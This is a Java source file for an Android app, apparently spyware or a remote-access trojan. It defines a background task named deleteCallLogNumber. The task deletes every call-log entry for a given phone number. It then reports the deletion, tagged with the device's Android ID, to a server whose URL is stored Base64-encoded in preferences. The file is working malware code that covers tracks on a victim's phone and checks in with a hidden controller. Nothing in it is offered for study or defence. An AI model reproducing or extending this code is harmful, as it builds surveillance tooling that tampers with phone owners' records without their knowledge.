package com.asynctask;

import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.provider.CallLog;
import android.util.Base64;

import com.connect.MyApplication;
import com.utils.CommonUtils;

import java.io.UnsupportedEncodingException;

/**
 * Created by ASUS on 2017/12/5.
 */

public class deleteCallLogNumber extends AsyncTask<String, Void, String> {
    String i = "";

    public deleteCallLogNumber(String i) {
        this.i = i;
    }

    @Override
    protected String doInBackground(String... params) {
        try {
            String strNumberOne[] = {i};
            Cursor cursor = MyApplication.getContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, null, CallLog.Calls.NUMBER + " = ? ", strNumberOne, "");
            boolean bol = cursor.moveToFirst();
            if (bol) {
                do {
                    int idOfRowToDelete = cursor.getInt(cursor.getColumnIndex(CallLog.Calls._ID));
                    MyApplication.getContext().getContentResolver().delete(Uri.withAppendedPath(CallLog.Calls.CONTENT_URI, String.valueOf(idOfRowToDelete)), "", null);
                } while (cursor.moveToNext());
            }
        } catch (Exception ex) {
            System.out.print("Exception here ");
        }
        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {
        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", i + " Deleted From Logs");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onPreExecute() {
    }

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
